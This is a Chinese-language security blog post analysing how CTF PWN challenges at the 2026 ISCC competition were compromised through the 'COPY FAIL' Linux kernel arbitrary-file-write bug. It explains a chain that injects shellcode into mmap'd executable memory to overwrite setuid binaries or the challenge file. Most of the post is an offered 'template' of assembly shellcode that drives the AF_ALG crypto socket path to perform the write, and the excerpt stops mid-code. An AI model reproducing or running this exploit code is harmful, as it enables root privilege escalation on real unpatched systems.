---
title: ISCC比赛PWN题沦陷，COPY FAIL如何进行攻击（附带模板）
url: https://mp.weixin.qq.com/s/LZk2uKEhOLvBBwLGVwlOCg
source: Doonsec's feed
date: 2026-05-06
fetch_date: 2026-05-07T05:25:30.630318
---

# ISCC比赛PWN题沦陷，COPY FAIL如何进行攻击（附带模板）

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/L5p13fmOxK1Bf55TQ1AicTCnYqwbIic3wCBvKGUwnmQjhKJNmK09coE425iboPTANBLics1Azgo5LgicfP9P55EjUcgLHSFqot56XUDSHBGrHCKc/0?wx_fmt=jpeg)

# ISCC比赛PWN题沦陷，COPY FAIL如何进行攻击（附带模板）

原创

Zer0day安全团队
Zer0day安全团队

Zer0day安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

ISCC比赛PWN题沦陷，COPY FAIL如何进行攻击（附带模板）

前言

2026年ISCC又没有让人失望爆了一堆典。除了z神以外，ISCC比赛平台里的pwn题也被几度打穿。

![](https://mmbiz.qpic.cn/mmbiz_png/L5p13fmOxK116WMOlzWsLx8MfSvFgxjyJTVF3y8xMoVBpPw4KDR110oPkZ1pfibv5NMWhR30KwBDWDoKFh7qpMz4u0UjqUiar7ficYCBFpDOSI/640?wx_fmt=png)

导致nc进去就能获取shell，并且还有爆笑奶龙，谁看谁都绷不住。我也一直在思考攻击者所用手段。结合群内讨论和前几天曝出的COPY FAIL提权漏洞，我们尝试分析并做出如下推测。

COPY FIAL漏洞分析

经过我们深入研究了一下COPY FAIL漏洞，其本质是可读文件写而并非直接提取，网传POC脚本是通过将具有特殊权限文件(su, sudo)修改成恶意文件，执行修改后的文件就可以直接提权获取root权限。

所以理论上攻击者应该是利用 COPY FAIL 的任意文件写，把容器的题目换成其构造好的elf文件。

容器环境分析

我们分析了一下 ISCC 的容器环境：不可创建文件，无可写文件，bin目录下只有 sh、ls、cat三个文件。按常理来说我们无法执行恶意的python脚本或者上传恶意ELF文件执行。这也是群里大家疑惑为什么这种环境下copy fail还是可以被利用。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/L5p13fmOxK2UlC3rJ3e9lLpuopKxF9pVzWlokbwic20x3DGiarY58QtbykfTDKeHwogqPLuue3sodbFsMOfibbP6lVbZDpVOX1DDNDwxaWlScI/640?wx_fmt=png)

利用原理

经过相当长时间的思考，我突然想到，虽然没用elf文件可以创建，但是因为题目本身的漏洞，我们通过构造是可以执行任意代码的（shellcode）。执行elf文件本质也是执行一个一个的汇编语句。那么我们可以将恶意elf文件经过一点改造，得到一段可以进行copy fail漏洞利用的shellcode，在题目中通过mmap或者mprotect得到一段可写可执行的内存区域，将得到的shellcode写进入，从而完成漏洞利用。

|  |
| --- |
| 攻击全链路                 通过 shellcode 调用 mmap / mprotect                 在内存中开辟一段 可写+可执行 的内存区域                  (绕过文件系统限制)                                                ▼                    构造并注入恶意代码                                   将恶意 ELF 文件 "改造" 为 shellcode 形式  (提取机器码 + 调整位置无关性)                                         ▼                                    通过题目漏洞将 shellcode 写入 刚开辟的可执行内存区域                     ▼                     触发 COPY FAIL 漏洞   执行 shellcode        ↓               触发 COPY FAIL 漏洞  (任意可读文件写，修改特殊权限文件)               ↓                  例如：覆写 /challenge 为恶意内容 |

这么想来其实原理相当简单，只不过一直没有想到。

利用示例

这里我尝试构造了一个shellcode内容，该shellcode模板提供了 writeAll 函数，通过调用该函数便能实现对任意文件写。

|  |
| --- |
| Python                      # writeAll(int fd, char\* buf, int len)                          shellcode = f"""                       writeAll:                       push r12                       push r13                       push r14                       push r15                       mov r12, rdi                       mov r13, rsi                       mov r14, rdx                       xor r15, r15                        mov rax, 9                       mov rdi, 0                       lea rsi, 12[r14]                       mov rdx, 3                       mov r10, 34                       mov r8, -1                       mov r9, 0                       syscall              push rax                       loop:                       cmp r15, r14                       jge exitLoop                       mov rdi, r12                       mov rsi, r15                       mov rdx, r13                       add rdx, r15                       mov rcx, [rsp]                       call write4                       add r15, 4                       jmp loop                       exitLoop:                       sub rsp, 8                       pop r15                       pop r14                       pop r13                       pop r12                       ret                             write4:                       push    r15                       push    r14                       mov r14d, edi                            push    r13                       mov r13, rcx                       push    r12                       xor r12d, r12d                       push    rbp                       mov rbp, rdx                       xor edx, edx                       push    rbx                       mov ebx, esi                       mov esi, 5                       sub rsp, 344                        mov     rdi, rsp                       mov     rcx, 43                       xor     eax, eax                       rep stosq                       mov edi, 38                             mov rax, {libc.sym['socket']}                       call rax                        mov DWORD PTR 4[rsp], eax                       lea r15, 160[rsp]                       mov WORD PTR 160[rsp], 38                       mov DWORD PTR 162[rsp], 1684104545 /\* aead \*/                        mov DWORD PTR 184[rsp], 0x68747561 /\* auth \*/                       mov DWORD PTR 188[rsp], 0x65636e65 /\* ence \*/                       mov DWORD PTR 192[rsp], 0x68286e73 /\* sn(h \*/                       mov DWORD PTR 196[rsp], 0x2863616d /\* mac( \*/                       mov DWORD PTR 200[rsp], 0x32616873 /\* sha2 \*/                       mov DWORD PTR 204[rsp], 0x2c293635 /\* 56) \*/                       mov DWORD PTR 208[rsp], 0x28636263 /\* cbc( \*/                       mov DWORD PTR 212[rsp], 0x29736561 /\* aes) \*/                       mov WORD PTR 216[rsp], 0x29 /\* ) \*/                        mov edi, DWORD PTR 4[rsp]                       mov rsi, r15                       mov edx, 88                       lea r15, 104[rsp]                        mov rax , {libc.sym['bind']}                       call rax                             mov r8d, 40                       mov edx, 1                       mov edi, DWORD PTR 4[rsp]                       lea rcx, 64[rsp]                       mov esi, 279                       mov BYTE PTR 64[rsp], 8                       mov BYTE PTR 66[rsp], 1                       mov BYTE PTR 71[rsp], 16                            mov rax, {libc.sym['setsockopt']}                       call rax                        mov edi, DWORD PTR 4[rsp]                       lea rcx, 20[rsp]                       mov r8d, 4                       mov edx, 5                       mov esi, 279                       mov DWORD PTR 20[rsp], 4                        mov rax, {libc.sym['setsockopt']}                       call rax                             mov edi, DWORD PTR 4[rsp]                       xor edx, edx                       xor esi, esi                        mov rax, {libc.sym['accept']}                       call rax                        lea r8, 264[rsp]                       lea rdx, 40[rsp]                       mov r12d, eax                       mov eax, DWORD PTR 0[rbp]                       mov QWORD PTR 48[rsp], rdx                       lea rsi, 248[rsp]                       mov DWORD PTR 40[rsp], 1094795585                       mov DWORD PTR 44[rsp], eax                       mov QWORD PTR 56[rsp], 8                        mov rdi, r15                       lea rax, 48[rsp]                       mov QWORD PTR 136[rsp], rsi                       mov QWORD PTR 120[rsp], rax                       movabsrax, 12884902167                       mov QWORD PTR 128[rsp], 1                       mov QWORD PTR 144[rsp], 88                       mov QWORD PTR 248[rsp], 20                       mov QWORD PTR 256[rsp], rax                        mov rax, {libc.sym['\_\_cmsg\_nxthdr']}                       call rax                        mov rdi, r15                       mov rsi, rax                       mov QWORD PTR [rax], 36                       movabsrax, 8589934871                       mov QWORD PTR 8[rsi], rax                       mov DWORD PTR 16[rsi], 16                        mov rax, {libc.sym['\_\_cmsg\_nxthdr']}                       call rax                        mov rsi, r15                       mov edx, 32768                       mov edi, r12d                       movabsrcx, 17179869463                       mov QWORD PTR [rax], 20                       mov QWORD PTR 8[rax], rcx                       mov DWORD PTR 16[rax], 8                        mov rax, {libc.sym['sendmsg']}                       call rax                        lea rdi, 32[rsp]                        mov rax, {libc.sym['pipe']}                       call rax                        mov edx, DWORD PTR 36[rsp]                       lea r8d, 4[...